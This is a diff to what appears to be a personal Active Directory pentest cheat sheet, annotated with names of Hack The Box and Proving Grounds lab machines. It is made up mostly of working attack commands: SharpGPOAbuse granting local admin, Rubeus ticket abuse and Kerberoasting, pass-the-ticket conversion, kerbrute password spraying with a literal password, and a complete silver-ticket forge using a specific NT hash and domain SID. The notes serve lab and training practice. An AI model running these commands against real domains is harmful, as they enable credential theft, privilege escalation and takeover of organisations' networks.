@@ -8,9 +8,9 @@ printer config -> return \[HTB AD Easy]
 
 {% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" %}
 
-<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
-<div align="left"><figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure></div>
 
 {% embed url="https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg" %}
 Ultimate AD Mindmap
@@ -61,6 +61,10 @@ bloodhound-python -u '[user]' -p '[password]' -d [domain] -dc [dc] -ns [ip] -c a
 
 **SharpGPOAbuse - Modify Group Policy Objects**
 
+{% hint style="info" %}
+Vault \[PG AD] for manual enumeration whether we have perms and all GPOs available
+{% endhint %}
+
 ```
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName [fake_GPO]
 gpupdate /force
@@ -102,15 +106,75 @@ defaultapppool user \[SeImpersonate no creds] from Flight \[HTB AD Hard] can per
 .\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
 .\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
 .\Rubeus.exe klist
+
 .\Rubeus.exe asktgt /user:Administrator /certificate:C:\Programdata\cert.pfx
-.\Rubeus.exe tgtdeleg /nowrap
+
+.\Rubeus.exe tgtdeleg /nowrap [HTB FLight AD]
+
+.\Rubeus.exe kerberoast /outfile:kerberoast
 ```
+
+With our base64 encoded ticket.kirbi
+
+```
+base64 -d ticket.kirbi > ticket.kirbi_b64
+python3 ticketConverter.py ticket.kirbi_b64 ticket.ccache
+export KRB5CCNAME=./ticket.ccache
+```
+
+Confirm by `klist`, what you do next is upto you depending on perms obv - DCSync or psexec?
 
 ## Kerberos
 
 ```
 ./kerbrute_linux_amd64 passwordspray -d FRIZZ.HTB ~/htb/rooms/frizz/output.txt '!suBcig@MehTed!R' --dc 'FRIZZDC.FRIZZ.HTB'
 ./kerbrute_linux_amd64 userenum -d egotistical-bank.local  ~/htb/sauna/newuser.txt --dc egotistical-bank.local -v | grep 'VALID' 
+```
+
+### Silver Ticket (Service Accounts)
+
+{% hint style="info" %}
+Nagoya \[PG AD]
+{% endhint %}
+
+```
+Get-Addomain
+S-1-5-21-1969309164-1513403977-1686805993
+
+SPN password hash (NT for Service1)
+E3A0168BC21CFB88B95C954A5B18F57C
+
+Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+MSSQL/nagoya.nagoya-industries.com
+
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
+export KRB5CCNAME=Administrator.ccache
+
+mssqlclient.py -k nagoya.nagoya-industries.com
+```
+
+For auth using kerberos ticket
+
+```
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]
+
+        NAGOYA-INDUSTRIES.COM = {
+                kdc=nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+
 ```
 
 #### GetNPUsers - ASREP Roasting for users with no pre-auth
@@ -124,10 +188,12 @@ python3 GetNPUsers.py [domain]/ -dc-ip [ip] -usersfile userlist.txt
 
 #### GetUserSPN - find Service Principal Names and hash of associated user account
 
+{% code title="13100" %}
 ```
 python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] 
 python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] -request <get ticket here>
 ```
+{% endcode %}
 
 #### DNSTool \[krbrelayx] - Edit  ADIDNS (AD Integrated DNS)
 
